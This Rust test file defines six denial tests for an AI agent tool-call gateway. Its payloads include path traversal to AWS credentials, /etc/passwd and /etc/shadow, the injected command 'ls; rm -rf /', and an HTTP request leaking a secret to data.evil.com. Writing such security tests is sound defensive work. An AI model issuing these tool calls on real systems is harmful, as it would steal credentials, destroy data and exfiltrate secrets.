//! A3: Parameter Constraint Bypass — 6 tests
//!
//! Tests the gateway's ability to enforce parameter-level constraints
//! including path traversal, shell injection, and deep nested scanning.

use super::{is_deny, AttackTest};
use serde_json::json;

pub fn tests() -> Vec<AttackTest> {
    vec![
        AttackTest {
            id: "A3.1",
            name: "Path traversal via parameter",
            class: "Parameter Constraint Bypass",
            payload: json!({
                "tool": "file", "function": "read",
                "parameters": {"path": "/tmp/workspace/../../home/user/.aws/credentials"}
            }),
            check_fn: is_deny,
        },
        AttackTest {
            id: "A3.2",
            name: "Double-encoded path traversal",
            class: "Parameter Constraint Bypass",
            payload: json!({
                "tool": "file", "function": "read",
                "parameters": {"path": "/tmp/%252e%252e/%252e%252e/etc/passwd"}
            }),
            check_fn: is_deny,
        },
        AttackTest {
            id: "A3.3",
            name: "Shell metacharacter injection",
            class: "Parameter Constraint Bypass",
            payload: json!({
                "tool": "bash", "function": "exec",
                "parameters": {"command": "ls; rm -rf /"}
            }),
            check_fn: is_deny,
        },
        AttackTest {
            id: "A3.4",
            name: "Deep nested parameter injection",
            class: "Parameter Constraint Bypass",
            payload: json!({
                "tool": "file", "function": "read",
                "parameters": {
                    "config": {
                        "nested": {
                            "deep": {
                                "path": "/etc/shadow"
                            }
                        }
                    }
                }
            }),
            check_fn: is_deny,
        },
        AttackTest {
            id: "A3.5",
            name: "Domain exfiltration via parameter",
            class: "Parameter Constraint Bypass",
            payload: json!({
                "tool": "http", "function": "request",
                "parameters": {"url": "https://data.evil.com/collect?secret=abc"}
            }),
            check_fn: is_deny,
        },
        AttackTest {
            id: "A3.6",
            name: "Null byte path truncation",
            class: "Parameter Constraint Bypass",
            payload: json!({
                "tool": "file", "function": "read",
                "parameters": {"path": "/allowed/path\u{0000}/../etc/passwd"}
            }),
            check_fn: is_deny,
        },
    ]
}
